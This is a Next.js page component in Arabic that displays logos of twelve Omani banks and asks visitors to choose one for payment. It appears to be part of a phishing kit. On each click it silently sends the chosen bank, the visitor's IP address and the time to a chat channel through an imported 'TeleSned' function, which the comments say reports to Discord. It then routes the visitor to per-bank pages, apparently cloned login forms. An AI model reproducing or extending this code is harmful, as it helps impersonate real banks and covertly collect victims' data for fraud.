'use client'

import React, { useState, useEffect } from "react";
import { useRouter } from 'next/navigation';
import Image from "next/image";
import TeleSned from "../../../server/TeleSend";

const Page = () => {
  const router = useRouter();
  const { Send } = TeleSned();
  const [ip, setIp] = useState('جاري التحميل...');

  // جلب IP من API
  useEffect(() => {
    const fetchIp = async () => {
      try {
        const response = await fetch('/api/ip');
        const data = await response.json();
        setIp(data.ip);
      } catch (error) {
        console.error('خطأ في جلب IP:', error);
        setIp('غير متاح');
      }
    };
    fetchIp();
  }, []);

  const banks = [
    { id: 1, name: 'بنك عمان العربي', src: '/bankaraboman.jpg', url: '/payment/banks/bankoman' },
    { id: 2, name: 'البنك العماني الدولي', src: '/b-oman-ntional.png', url: '/payment/banks/bankoman' },
    { id: 3, name: 'البنك الأهلي', src: '/bankahle.png', url: '/payment/banks/bankaz' },
    { id: 4, name: 'بنك العز الإسلامي', src: '/bankAz.png', url: '/payment/banks/bankaz' },
    { id: 5, name: 'بنك صحار', src: '/saharabank.png', url: '/payment/banks/bankoman' },
    { id: 6, name: 'بنك نزوى', src: '/b-nzwa.webp', url: '/payment/banks/b-nzwa' },
    { id: 7, name: 'بنك طفار الإسلامي', src: '/b-dafar.svg', url: '/payment/banks/bankaz' },
    { id: 8, name: 'بنك مسقط', src: '/b-msqt.jpg', url: '/payment/banks/bankmsqt' },
    { id: 9, name: 'بنك HSBC', src: '/b-hsbc.jpg', url: '/payment/banks/bankoman' },
    { id: 10, name: 'بنك الاسكان', src: '/bankaskan.png', url: '/payment/banks/bankaz' },
    { id: 11, name: 'بنك ميثاق', src: '/b-mythaq.png', url: '/payment/banks/bankaz' },
    { id: 12, name: 'بنك ظفار', src: '/b-dafar no islam.png', url: '/payment/banks/bankoman' }
  ];

  const handleBankClick = (bankUrl, bankName, bankId) => {
    // إرسال البيانات إلى Discord
    const sendToDiscord = async () => {
      try {
        const description = `🏦 **اختيار البنك**\n\n` +
                           `📌 **البنك المختار:** ${bankName}\n` +
                           `🔍 **رقم البنك:** ${bankId}\n` +
                           `🌐 **IP المستخدم:** ${ip}\n` +
                           `🕒 **الوقت:** ${new Date().toLocaleString('ar-OM')}`;
        
        Send(description);
        console.log('✅ تم إرسال بيانات البنك إلى Discord');
      } catch (error) {
        console.error('❌ خطأ في الإرسال إلى Discord:', error);
      }
    };

    sendToDiscord();
    
    // التوجيه إلى صفحة البنك مع إضافة Query Parameters
    router.push(`${bankUrl}?bankId=${bankId}&bankName=${encodeURIComponent(bankName)}&ip=${encodeURIComponent(ip)}`);
  };

  return (
    <main className="flex min-h-screen flex-col items-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
      <div className="z-10 w-full max-w-4xl mx-auto">
        {/* العنوان */}
        <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
          <h1 className="text-2xl md:text-3xl font-bold text-[#800000] text-center">
            اختر البنك الخاص بك للدفع
          </h1>
          <p className="text-gray-600 mt-2 text-center text-sm md:text-base">
            يرجى اختيار البنك الذي ترغب في الدفع من خلاله
          </p>
        </div>

        {/* شبكة البنوك */}
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 md:gap-6">
          {banks.map((bank) => (
            <div
              key={bank.id}
              onClick={() => handleBankClick(bank.url, bank.name, bank.id)}
              className="flex flex-col items-center justify-center bg-white rounded-xl shadow-md hover:shadow-2xl transition-all duration-300 transform hover:scale-105 cursor-pointer p-4 md:p-6 border border-gray-100 hover:border-[#800000]"
            >
              {/* شعار البنك */}
              <div className="w-20 h-20 md:w-24 md:h-24 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center">
                <Image
                  src={bank.src}
                  alt={bank.name}
                  width={80}
                  height={80}
                  className="object-contain p-2"
                  onError={(e) => {
                    e.target.src = '/bank-placeholder.png';
                  }}
                />
              </div>
              {/* اسم البنك */}
              <p className="text-sm md:text-base font-semibold text-gray-700 mt-3 text-center leading-tight">
                {bank.name}
              </p>
            </div>
          ))}
        </div>

        {/* زر العودة */}
        <div className="mt-8 text-center">
          <button
            onClick={() => router.back()}
            className="px-6 py-2 text-gray-600 hover:text-[#800000] transition-colors duration-200"
          >
            ← العودة
          </button>
        </div>
      </div>
    </main>
  );
};

export default Page;